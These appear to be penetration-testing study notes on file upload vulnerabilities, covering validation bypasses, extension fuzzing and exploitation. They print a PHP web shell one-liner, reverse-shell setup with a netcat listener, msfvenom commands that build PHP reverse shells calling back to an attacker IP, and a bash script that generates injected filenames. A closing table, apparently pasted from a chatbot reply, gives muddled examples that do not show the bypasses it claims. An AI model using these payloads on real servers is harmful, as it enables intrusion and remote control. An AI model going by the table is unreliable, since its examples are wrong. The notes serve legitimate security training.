# File Upload Vulnerability Notes

## Key Concepts on File Upload Vulnerabilities

### 1. **Absent Validation**
   - Web applications may allow uploads without validation filters.
   - Vulnerable applications allow uploading any file type, including potentially malicious files like web shells or reverse shells.
   - Uploading and executing these scripts may provide full control over the server.

### 2. **Arbitrary File Upload**
   - Web apps may allow uploading any file, without specifying restrictions on file types (e.g., `.php` files).
   - The file selector dialog may show "All Files," indicating no restrictions are enforced on the frontend.
   - If backend validation is absent, it may allow arbitrary file types to be uploaded, leading to potential server exploitation.

### 3. **Identifying Web Framework**
   - To exploit arbitrary file upload, we need to know the server's scripting language.
   - **Web Shell** and **Reverse Shell** scripts require knowing the language of the web server (e.g., PHP, ASP).
   - The **file extension** in URLs can provide clues (e.g., `.php` might indicate PHP backend), though sometimes file extensions may be hidden due to `web routes`
> Web routes are instructions in a web application that map specific URLs to corresponding actions or pages, determining what content or functionality is shown when a user visits a particular address.

   - Testing common web extensions (e.g., `/index.php`) can help identify the technology.
   - Tools like **Burp Intruder** can automate this process by fuzzing extensions.
   - `Wappalyzer` browser extension helps identify the technologies in use on the site.

### 4. **Vulnerability Identification**
   - Once the backend language is identified, you can upload a file in the same language (e.g., a PHP script).
   - Testing with a basic PHP script like `<?php echo "Hello HTB"; ?>` helps confirm if the uploaded file can execute PHP code.
   - If the file is successfully uploaded and executed, the server is vulnerable to file upload exploitation.
   - Example test: Upload `test.php` and access the uploaded file. If the PHP code is executed, the server is vulnerable.

### 5. **Exploiting the Vulnerability**
   - After confirming file upload vulnerability, the next step is to exploit it for remote control of the server by uploading a malicious script.

## Exploitation Techniques

### Web Shells
   - Web shells are scripts that provide a way to interact with the backend server.
   - Examples include **phpbash**, a terminal-like PHP web shell, and others available in **SecLists**.
   - Upload the web shell through the vulnerable upload feature and access it via its link:
     ```
     http://SERVER_IP:PORT/uploads/phpbash.php
     ```
   - Custom Web Shell Example:
     ```php
     <?php system($_REQUEST['cmd']); ?>
     ```
     - Use the `?cmd=` parameter to execute commands (e.g., `?cmd=id`).
     - For browsers, use source-view (`Ctrl+U`) for better output formatting.

### Reverse Shells
   - Reverse shells allow the server to connect back to the attacker's machine, providing interactive control.
   - Tools like **pentestmonkey PHP reverse shell** or scripts from **SecLists** can be used.
   - Edit the script with your IP/PORT:
     ```php
     $ip = 'OUR_IP';     // CHANGE THIS
     $port = OUR_PORT;   // CHANGE THIS
     ```
   - Start a Netcat listener:
     ```
     nc -lvnp OUR_PORT
     ```
   - Upload the script and execute it via the web app:
     ```
     http://SERVER_IP:PORT/uploads/reverse.php
     ```
   - Example reverse shell generation with `msfvenom`:
     ```
     msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
     ```

### Writing Custom Scripts
   - Custom scripts can be written in the web server's language using native functions like `system()` in PHP or `eval()` in ASP.NET.
   - Use `msfvenom` for generating scripts for various languages:
     ```
     msfvenom -p payload LHOST=OUR_IP LPORT=OUR_PORT -f format > shell.ext
     ```

## Tools Overview

### Pentestmonkey
   - **What It Is**: A collection of tools and scripts designed for penetration testing, including reliable reverse shells.
   - **Key Usage**:
     - Edit `php-reverse-shell.php` to include your IP and port.
     - Upload to the vulnerable server and access its link to gain shell access.

### Msfvenom
   - **What It Is**: A Metasploit tool used to generate payloads, including reverse and bind shells, for various platforms and languages.
   - **Key Usage**:
     - Syntax:
       ```
       msfvenom -p payload LHOST=OUR_IP LPORT=OUR_PORT -f format > outputfile
       ```
     - Example for PHP:
       ```
       msfvenom -p php/reverse_php LHOST=192.168.1.10 LPORT=4444 -f raw > reverse.php
       ```
     - Payloads and formats:
       - `-p`: Specify the payload (e.g., `php/reverse_php`).
       - `-f`: Format (e.g., `raw`, `exe`, `elf`).

## Client-Side Validation

### 1. **Overview**
Many web applications rely on front-end JavaScript for file format validation. This validation prevents files that do not meet specified criteria (e.g., non-image formats) from being uploaded. However, since these validations occur on the client-side, they can be bypassed by:

- Modifying the upload request directly to interact with the server, skipping validation.
- Editing the front-end code via browser developer tools to disable or modify validations.

### 2. **Back-End Request Modification**
#### Steps to Bypass Validation:
1. **Examine the Request**: Capture an image upload request using Burp Suite.
2. **Modify the Request**:
   - Change `filename="HTB.png"` to `filename="shell.php"`.
   - Replace the file content with a PHP web shell.
3. **Send the Modified Request**:
   - Ensure that the server does not perform back-end validation.
   - If successful, the file will upload, and you can access the web shell.

#### Key Points:
- The `Content-Type` header may not require modification.
- A successful upload typically results in a confirmation message like "File successfully uploaded."

### 3. **Disabling Front-End Validation**
#### Using Browser Developer Tools:
1. **Inspect the File Input**:
   - Use [CTRL+SHIFT+C] to toggle the Page Inspector.
   - Locate the `<input>` tag for file uploads, e.g.:
     ```html
     <input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
     ```
2. **Analyze the Validation Function**:
   - Identify the `onchange="checkFile(this)"` attribute.
   - Use the browser console ([CTRL+SHIFT+K]) to inspect the `checkFile` function:
     ```javascript
     function checkFile(File) {
         if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
             $('#error_message').text("Only images are allowed!");
             File.form.reset();
             $("#submit").attr("disabled", true);
         }
     }
     ```
   - Note how the function restricts file extensions.

3. **Bypass the Validation**:
   - Remove the `onchange="checkFile(this)"` attribute:
     - Double-click the function name in the inspector and delete it.
   - Optionally, remove `accept=".jpg,.jpeg,.png"` to allow easier file selection.

4. **Upload the Web Shell**:
   - Select the PHP web shell using the file input dialog.
   - Submit the form; the client-side validation is bypassed.

#### Important Notes:
- These modifications are temporary and will not persist through a page refresh.
- The primary goal is to bypass the validation to upload a malicious file.

### 4. **Locating and Accessing the Uploaded File**
Once the web shell is uploaded, inspect the profile image URL to locate the file:
```html
<img src="/profile_images/shell.php" class="profile-image" id="profile-image">
```

## **Blacklisting Extensions**
   - Back-end validation using a blacklist is a weak approach for file type validation as it is often incomplete and can be bypassed.
   - Example of a blacklist implementation in PHP:
     ```php
     $fileName = basename($_FILES["uploadFile"]["name"]);
     $extension = pathinfo($fileName, PATHINFO_EXTENSION);
     $blacklist = array('php', 'php7', 'phps');

     if (in_array($extension, $blacklist)) {
         echo "File type not allowed";
         die();
     }
     ```
   - Common issues with blacklist-based validation:
     - Case sensitivity: A file named `pHp` might bypass the blacklist on Windows servers due to case insensitivity.
     - Limited scope: Many extensions (e.g., `.phtml`) that can execute PHP are not included in the blacklist.

## **Fuzzing Extensions**
   - Fuzzing can identify allowed extensions by testing multiple file extensions to determine which are not blacklisted.
   - Tools and resources:
     - Use extension lists from **PayloadsAllTheThings** or **SecLists**.
     - Burp Suite Intruder can automate extension fuzzing:
       1. Send a file upload request to Intruder.
       2. Set the file extension (e.g., `.php`) as the fuzzing position.
       3. Load the PHP extensions list as payloads.
       4. Analyze responses for successful uploads (e.g., "File successfully uploaded").

## **Non-Blacklisted Extensions**
   - Some extensions like `.phtml` may not be blacklisted and could allow PHP code execution.
   - Steps to exploit:
     1. Upload a file with a non-blacklisted extension (e.g., `shell.phtml`).
     2. Include PHP code, such as a web shell, in the file content.
     3. Access the uploaded file (e.g., `http://SERVER_IP/profile_images/shell.phtml`) and confirm its execution by testing a command.
> `TIP:` When fuzzing the extensions in Burp Intruder, you can also change the the POST request data to include something like a hello word command in php and you can check which php extensions
> are able to run this command. `Also`, you should consider switching off URL encoding before the Intruder attack so all the extensions get sent "as is"!


## Whitelist Filters

**Whitelist vs Blacklist:**
   - **Whitelist**: More secure; only allows specified file extensions.
   - **Blacklist**: Allows wide variety but blocks known harmful extensions; useful in more flexible upload systems.
   - Both can be used together depending on use case.

**Whitelisting Extensions:**
   - Example code uses regex to validate allowed extensions (e.g., `.jpg`, `.jpeg`).
   - Common mistake: regex may check if the extension *contains* certain extensions rather than ensuring it *ends* with them.
   - **Attack method**: Double extensions (e.g., `shell.jpg.php`) can bypass simple regex checks.

**Double Extensions Attack:**
   - If the system only checks for the presence of an extension, attackers can append valid extensions (e.g., `.jpg.php`) to pass the whitelist test while uploading malicious files.
   - **Example**: `shell.jpg.php` may be uploaded, and PHP code will execute.

**Reverse Double Extension Attack:**
   - Misconfigurations in server (e.g., Apache2) might allow files like `shell.php.jpg` to execute PHP code, despite the whitelist.
   - **Example**: Apache regex configuration could be too lenient (`<FilesMatch ".+\.ph(ar|p|tml)">`), allowing files that contain `.php` but end with `.jpg` to still execute PHP.

**Character Injection:**
   - **Injection methods**: Inject special characters to bypass validation:
     - `%20`, `%00`, `%0a`, `%0d0a`, `/`, `.\`, `.`, `…`, `:`
   - **Effect**: Tricking server to misinterpret the filename, allowing PHP code execution.
   - Example: `shell.php%00.jpg` works on older PHP versions.
   - **Fuzzing tool**: Generate permutations of filenames with injected characters to find valid uploads.
**Custom Wordlist Generation for Fuzzing:**
   - Use a bash script to create filename permutations with injected characters to test against upload forms.
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

Here is the revised list, including examples of how each character injection can be used to bypass file upload whitelist validation:

### Character Injection List for File Upload Bypass:

| Character Injection | Description                                       | Example File Name | Use Case |
|---------------------|---------------------------------------------------|--------------------|----------|
| **%20 (space)**     | URL encoding for a space character                | `shell%20name.php` | Bypasses filters that don't account for spaces, allowing PHP files to pass as valid. |
| **%0a (newline, LF)**| URL encoding for a newline character (Line Feed)  | `shell%0aname.php` | Injects a newline into the file name, which may bypass filters or cause unintended parsing behavior. |
| **%00 (null byte)** | URL encoding for a null byte (end of string)      | `shell%00name.php` | Terminates the string early, causing filters to incorrectly stop checking after the null byte, potentially bypassing file type checks. |
| **%0d0a (CRLF)**    | URL encoding for carriage return + newline (CRLF)| `shell%0d0aname.php` | CRLF can be used for header injection or bypassing filters that only check the file extension, potentially leading to security vulnerabilities. |
| **/ (slash)**       | Directory separator (path traversal)              | `shell/..%5c%5c/etc/passwd` | Exploits path traversal vulnerabilities, allowing files to be uploaded to unintended locations, such as system files. |
| **.\\ (relative path on Windows)**| Windows-specific relative path                | `shell.\uploads\file.php` | Windows uses `.\\` to reference directories, which could bypass directory restrictions by allowing files to be uploaded outside the allowed folder. |
| **. (dot - current directory)**| Refers to the current directory                | `shell./uploads/file.php` | Uses `.` to reference the current directory, potentially bypassing checks that only allow uploads within a certain folder. |
| **… (ellipsis)**    | Used as an ellipsis character, often overlooked by filters | `file…name.php`    | Bypasses filters that don't account for the ellipsis character, allowing files with unusual names to bypass validation. |
| **: (colon)**       | Special character used in Windows paths           | `C:\uploads\file.php` | In Windows, `:` is part of file paths (e.g., `C:\`). Some filters may not properly handle this character, allowing bypasses. |

### Explanation:
- **%20**: A space encoded as `%20` can bypass file extension filters that don't handle URL encoding or spaces in file names.
- **%0a**: A newline encoded as `%0a` could cause misinterpretation of the file name and allow it to pass through a filter that only checks for certain extensions.
- **%00**: The null byte (`%00`) is a classic method to terminate strings early, effectively bypassing file extension checks or even path restrictions.
- **%0d0a**: CRLF injection is used in file upload attacks to insert control characters into the file name, potentially exploiting header injection or bypassing extension checks.
- **/**: The directory separator can be used for path traversal, making it possible to upload files to sensitive locations outside the designated upload directory.
- **.\\**: Windows-style relative paths can be used to bypass directory restrictions by referring to locations outside the intended upload folder.
- **.**: Using the current directory (.) can trick filters into allowing uploads to unintended locations.
- **…**: The ellipsis character can be used to bypass filters that are not designed to handle this character, helping an attacker obfuscate the file name.
- **:**: In Windows paths, the colon is used in drive names (e.g., `C:`). If the filter doesn’t handle it properly, it may allow an attacker to upload files to other locations.

This list includes specific examples showing how each character can be used in file upload bypass attacks, helping to explain how these characters circumvent whitelist validation.
